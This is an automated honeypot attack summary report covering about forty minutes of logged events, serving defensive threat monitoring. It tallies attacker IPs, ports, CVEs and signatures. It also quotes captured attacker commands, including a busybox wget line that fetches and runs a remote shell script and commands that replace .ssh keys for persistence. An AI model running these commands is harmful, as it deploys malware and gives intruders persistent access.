Honeypot Attack Summary Report

Report generated at: 2025-10-26T22:01:31Z
Timeframe: 2025-10-26T21:20:01Z to 2025-10-26T22:00:01Z
Files used for this report:
- agg_log_20251026T212001Z.json
- agg_log_20251026T214001Z.json
- agg_log_20251026T220001Z.json

### Executive Summary
This report summarizes 9,197 events collected from the honeypot network. The majority of attacks targeted Sentrypeer, Honeytrap, and Ciscoasa honeypots. The most prominent attacker IP was 198.23.190.58. The most targeted port was 5060 (SIP). The most frequently observed CVE was CVE-2005-4050, related to a SIP vulnerability. A significant number of commands were executed, indicating reconnaissance and attempts to download and execute malicious scripts.

### Detailed Analysis

**Attacks by Honeypot**
- Sentrypeer: 2469
- Honeytrap: 1940
- Suricata: 1409
- Cowrie: 1282
- Ciscoasa: 1738
- Tanner: 70
- Mailoney: 111
- H0neytr4p: 75
- ConPot: 25
- Adbhoney: 20
- Dionaea: 26
- Redishoneypot: 9
- Ipphoney: 7
- ssh-rsa: 6
- ElasticPot: 5
- Honeyaml: 3
- Medpot: 2

**Top Attacking IPs**
- 198.23.190.58: 1091
- 144.172.108.231: 819
- 185.243.5.148: 454
- 185.243.5.158: 275
- 152.42.216.249: 217
- 107.170.36.5: 156
- 103.163.215.10: 134
- 115.21.183.150: 149
- 45.119.80.10: 113
- 68.183.149.135: 112

**Top Targeted Ports/Protocols**
- 5060: 2469
- UDP/5060: 296
- 8333: 168
- 22: 210
- 443: 80
- 25: 111
- 80: 68
- TCP/80: 48
- 5905: 79
- 5904: 80
- 5901: 57
- 5902: 46
- 5903: 39

**Most Common CVEs**
- CVE-2005-4050: 293
- CVE-2002-0013 CVE-2002-0012: 5
- CVE-1999-0265: 3
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 3
- CVE-2019-11500 CVE-2019-11500: 3
- CVE-2024-4577 CVE-2024-4577: 2
- CVE-2024-4577 CVE-2002-0953: 2
- CVE-2021-35394 CVE-2021-35394: 1
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773: 1
- CVE-2021-42013 CVE-2021-42013: 1
- CVE-2006-2369: 1

**Commands Attempted by Attackers**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- uname -a
- whoami
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...

**Signatures Triggered**
- ET VOIP MultiTech SIP UDP Overflow: 293
- 2003237: 293
- ET DROP Dshield Block Listed Source group 1: 270
- 2402000: 270
- ET SCAN NMAP -sS window 1024: 135
- 2009582: 135
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 125
- 2023753: 125
- ET INFO Reserved Internal IP Traffic: 51
- 2002752: 51
- ET HUNTING RDP Authentication Bypass Attempt: 26
- 2034857: 26

**Users / Login Attempts**
- 345gs5662d34/345gs5662d34
- root/harrison20
- root/hash2004
- root/
- root/hb2015
- root/Hchavez2014
- root/hd93Palosanto

**Files Uploaded/Downloaded**
- sh: 98
- wget.sh;: 8
- Mozi.a+varcron: 2
- w.sh;: 2
- c.sh;: 2
- ns#: 2

**HTTP User-Agents**
- None Observed

**SSH Clients**
- None Observed

**SSH Servers**
- None Observed

**Top Attacker AS Organizations**
- None Observed

### Key Observations and Anomalies
- The high number of attacks on port 5060 (SIP) and the prevalence of CVE-2005-4050 suggest a targeted campaign against VoIP infrastructure.
- The commands executed indicate a common pattern of attackers attempting to gain persistent access by adding their SSH keys to the `authorized_keys` file.
- Several commands are related to downloading and executing shell scripts from a remote server (213.209.143.62), a typical method for deploying malware.
- The Suricata signatures triggered are consistent with reconnaissance (NMAP scans) and attacks against known vulnerabilities.
- The lack of HTTP User-Agents, SSH clients/servers, and AS organizations suggests that these fields may not be fully populated in the raw logs or that the attacks are of a nature that does not involve these indicators.
